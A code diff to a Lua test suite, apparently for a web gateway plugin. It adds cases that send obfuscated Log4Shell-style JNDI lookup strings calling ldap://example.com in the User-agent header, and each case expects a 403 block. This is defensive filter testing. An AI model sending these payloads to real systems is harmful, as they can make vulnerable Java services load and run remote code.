@@ -126,7 +126,7 @@ for _, strategy in helpers.all_strategies() do
         assert.response(r).has.status(403)
       end)
 
-      it("Checks for date format trickery", function()
+      it("Checks for date format", function()
         local r = client:get("/request", {
           headers = {
             host = "test1.dev",
@@ -135,6 +135,42 @@ for _, strategy in helpers.all_strategies() do
         })
         assert.response(r).has.status(403)
       end)
+
+      it("Checks for unicode i", function()
+        local r = client:get("/request", {
+          headers = {
+            host = "test1.dev",
+            ['User-agent'] = "${jnd${upper:ı}:ldap://example.com/z}"
+          }
+        })
+        assert.response(r).has.status(403)
+      end)
+
+      it("Checks for missing sys default replacement", function()
+        local r = client:get("/request", {
+          headers = {
+            host = "test1.dev",
+            ['User-agent'] = "${jnd${sys:SYS_NAME:-i}:ldap://example.com/z}"
+          }
+        })
+        assert.response(r).has.status(403)
+      end)
+
+      it("Checks for :- ", function()
+        local r = client:get("/request", {
+          headers = {
+            host = "test1.dev",
+            ['User-agent'] = "${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://example.com/z}"
+          }
+        })
+        assert.response(r).has.status(403)
+      end)
+
+
+
+
+
+
 
   end)
 
